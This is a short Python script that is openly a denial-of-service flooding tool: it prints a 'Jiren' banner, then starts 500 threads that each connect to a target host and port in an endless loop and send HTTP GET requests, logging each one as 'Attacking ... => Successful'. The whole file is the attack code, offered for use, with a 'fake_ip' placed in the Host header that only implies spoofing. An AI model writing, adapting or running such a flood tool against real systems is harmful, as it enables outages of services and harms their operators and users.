import socket
import threading
import os
import time
target = '127.0.0.1'
fake_ip = '182.21.20.32'  # Use 'fake_ip' for consistency
port = 5500

# this part is for logo - not crucial you can skip it
def loading():
     os.system("toilet Jiren")
     time.sleep(5)
loading()

# this is where the attacking starts. it uses the get method to send the request to the target provided above
def attack():     
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((target, port))
            s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
            s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
            global attack_num
            attack_num += 1

            # this is message what the user sees on the screen if the attacking is successful
            print(f"ID {attack_num} Attacking {target} through port {port} => Successful")
           
        except Exception as e:
            print(f"ID {attack_num} Attacking {target} through port {port} => not Successful. Error {e}")
           
        finally:
            s.close()
 

attack_num = 0

# i use the run multiple attack function using thread module
def startThreading():
    for i in range(500):
        thread = threading.Thread(target=attack)
        thread.start()
startThreading()



